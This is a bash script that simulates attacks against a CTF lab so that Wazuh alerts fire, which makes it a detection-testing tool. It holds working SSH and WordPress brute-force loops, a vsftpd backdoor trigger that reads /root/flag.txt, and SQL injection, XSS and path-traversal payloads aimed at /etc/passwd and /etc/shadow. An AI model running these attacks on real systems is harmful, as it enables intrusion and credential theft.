#!/bin/bash
# ============================================================
#  CTF Attack Simulator
#  Generates realistic attack traffic against the lab so you
#  can see Wazuh alerts fire in the dashboard.
#  Usage: ./scripts/attack-simulator.sh [scenario]
#  Scenarios: all | ssh | ftp | web | sqli | scan
# ============================================================
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

TARGET_HOST="${TARGET_HOST:-localhost}"
WAZUH_HOST="${WAZUH_HOST:-10.0.10.2}"

log()  { echo -e "${CYAN}[SIM]${RESET} $*"; }
ok()   { echo -e "${GREEN}[OK] ${RESET} $*"; }
warn() { echo -e "${YELLOW}[!]  ${RESET} $*"; }

# ── Pre-checks ────────────────────────────────────────────
require_tool() {
  command -v "$1" &>/dev/null || { warn "$1 not found – skipping scenario"; return 1; }
}

# ── Scenario: SSH brute force ─────────────────────────────
sim_ssh() {
  log "Starting SSH brute-force simulation (10 attempts)..."
  local users=("root" "admin" "user" "test" "guest")
  local passwords=("wrongpass" "123456" "letmein" "abc123" "pass")
  for u in "${users[@]}"; do
    for p in "${passwords[@]}"; do
      ssh -o StrictHostKeyChecking=no \
          -o BatchMode=yes \
          -o ConnectTimeout=2 \
          -p 2222 \
          "${u}@${TARGET_HOST}" echo "connected" 2>/dev/null || true
      sleep 0.1
    done
  done
  ok "SSH brute-force simulation complete – check Wazuh rule 100030"
}

# ── Scenario: FTP brute force + backdoor trigger ──────────
sim_ftp() {
  require_tool ftp || return 0
  log "Starting FTP anonymous access simulation..."
  # Anonymous login
  ftp -n -p "${TARGET_HOST}" 2121 <<EOF 2>/dev/null || true
user anonymous anonymous@ctf.lab
ls
get flag.txt /tmp/ftp_flag.txt
bye
EOF
  ok "FTP anonymous flag retrieved"

  log "Simulating vsftpd backdoor trigger (USER with :) smiley)..."
  # The backdoor is triggered by sending USER with ":)"
  (echo -e "USER backdoor:)\nPASS anypass\nquit"; sleep 2) | \
    nc -w 5 "${TARGET_HOST}" 2121 2>/dev/null || true

  sleep 2
  log "Attempting connection to backdoor port 6200..."
  (echo "id"; echo "cat /root/flag.txt"; echo "exit"; sleep 2) | \
    nc -w 5 "${TARGET_HOST}" 6200 2>/dev/null || true
  ok "FTP backdoor simulation complete – check Wazuh rule 100042"
}

# ── Scenario: Web scanning ────────────────────────────────
sim_scan() {
  require_tool curl || return 0
  log "Simulating web scanner (Nikto User-Agent)..."

  local ua="Mozilla/5.0 (Nikto/2.1.6)"
  local paths=(
    "/wp-login.php" "/xmlrpc.php" "/wp-config.php" "/wp-config.php.bak"
    "/admin" "/phpmyadmin" "/.env" "/.git/config"
    "/backup.zip" "/db.sql" "/etc/passwd" "/proc/self/environ"
    "/wp-content/debug.log" "/wp-admin/" "/wp-json/wp/v2/users"
  )

  for target_port in 8080 8081 8084 8085; do
    log "  Scanning port $target_port..."
    for path in "${paths[@]}"; do
      curl -sk \
        -A "$ua" \
        -o /dev/null \
        -w "  %{http_code} ${path}\n" \
        "http://${TARGET_HOST}:${target_port}${path}" || true
      sleep 0.05
    done
  done
  ok "Web scan simulation complete – check Wazuh rules 100060, 100061"
}

# ── Scenario: SQL injection ───────────────────────────────
sim_sqli() {
  require_tool curl || return 0
  log "Simulating SQL injection attacks..."

  local sqli_payloads=(
    "' OR 1=1--"
    "' UNION SELECT 1,2,3--"
    "1; DROP TABLE users--"
    "' OR 'a'='a"
    "admin'--"
    "1' AND SLEEP(5)--"
  )

  for payload in "${sqli_payloads[@]}"; do
    # DVWA login form
    curl -sk \
      -o /dev/null \
      -d "username=${payload}&password=test&Login=Login" \
      "http://${TARGET_HOST}:8081/login.php" || true

    # WordPress URL injection
    curl -sk \
      -o /dev/null \
      "http://${TARGET_HOST}:8080/?id=${payload}" || true
    sleep 0.1
  done
  ok "SQL injection simulation complete – check Wazuh rule 100010, 100011"
}

# ── Scenario: XSS ─────────────────────────────────────────
sim_xss() {
  require_tool curl || return 0
  log "Simulating XSS attacks..."

  local xss_payloads=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(document.cookie)>"
    "javascript:alert(1)"
    "<svg onload=alert(1)>"
  )

  for payload in "${xss_payloads[@]}"; do
    curl -sk \
      -o /dev/null \
      "http://${TARGET_HOST}:8081/vulnerabilities/xss_r/?name=${payload}" || true
    sleep 0.1
  done
  ok "XSS simulation complete – check Wazuh rule 100015"
}

# ── Scenario: LFI ────────────────────────────────────────
sim_lfi() {
  require_tool curl || return 0
  log "Simulating LFI / path traversal attacks..."

  local lfi_payloads=(
    "../../../../etc/passwd"
    "%2e%2e%2f%2e%2e%2fetc/passwd"
    "....//....//etc/passwd"
    "/proc/self/environ"
    "/etc/shadow"
  )

  for payload in "${lfi_payloads[@]}"; do
    curl -sk \
      -o /dev/null \
      "http://${TARGET_HOST}:8085/index.php?target=${payload}" || true

    curl -sk \
      -o /dev/null \
      "http://${TARGET_HOST}:8084/index.php?page=${payload}" || true
    sleep 0.1
  done
  ok "LFI simulation complete – check Wazuh rules 100020, 100021"
}

# ── Scenario: WordPress specific ─────────────────────────
sim_wordpress() {
  require_tool curl || return 0
  log "Simulating WordPress-specific attacks..."

  # XML-RPC brute force
  log "  XML-RPC brute force..."
  for i in {1..12}; do
    curl -sk \
      -o /dev/null \
      -X POST \
      -H "Content-Type: text/xml" \
      -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>wrongpassword</value></param></params></methodCall>' \
      "http://${TARGET_HOST}:8080/xmlrpc.php" || true
    sleep 0.1
  done

  # WP user enumeration
  log "  User enumeration via REST API..."
  curl -sk "http://${TARGET_HOST}:8080/wp-json/wp/v2/users" -o /dev/null || true

  # wp-login.php brute
  log "  wp-login.php brute force..."
  for pass in "admin" "password" "123456" "wordpress" "letmein"; do
    curl -sk \
      -o /dev/null \
      -c /tmp/wp_cookies.txt \
      -b /tmp/wp_cookies.txt \
      -X POST \
      -d "log=admin&pwd=${pass}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
      "http://${TARGET_HOST}:8080/wp-login.php" || true
    sleep 0.1
  done
  ok "WordPress attacks simulation complete – check Wazuh rules 100001–100005"
}

# ── Run all or specific scenario ─────────────────────────
SCENARIO="${1:-all}"

echo -e "${CYAN}"
echo "  ╔══════════════════════════════════════════════╗"
echo "  ║     CTF Attack Simulator – Wazuh Test        ║"
echo "  ╚══════════════════════════════════════════════╝"
echo -e "${RESET}"
echo -e "  Target host : ${YELLOW}${TARGET_HOST}${RESET}"
echo -e "  Scenario    : ${YELLOW}${SCENARIO}${RESET}"
echo ""
warn "This tool is for CTF/lab use ONLY. Never run against real systems."
echo ""

case "$SCENARIO" in
  ssh)       sim_ssh ;;
  ftp)       sim_ftp ;;
  web|scan)  sim_scan ;;
  sqli)      sim_sqli ;;
  xss)       sim_xss ;;
  lfi)       sim_lfi ;;
  wordpress) sim_wordpress ;;
  all)
    sim_ssh
    sim_ftp
    sim_scan
    sim_sqli
    sim_xss
    sim_lfi
    sim_wordpress
    ;;
  *)
    echo "Usage: $0 {all|ssh|ftp|web|sqli|xss|lfi|wordpress}"
    exit 1
    ;;
esac

echo ""
echo -e "${GREEN}${BOLD}[✓] Attack simulation complete!${RESET}"
echo -e "    Open Wazuh Dashboard at ${CYAN}https://${WAZUH_HOST}${RESET} to see alerts."
echo -e "    Filter: ${YELLOW}rule.groups: ctf${RESET}"
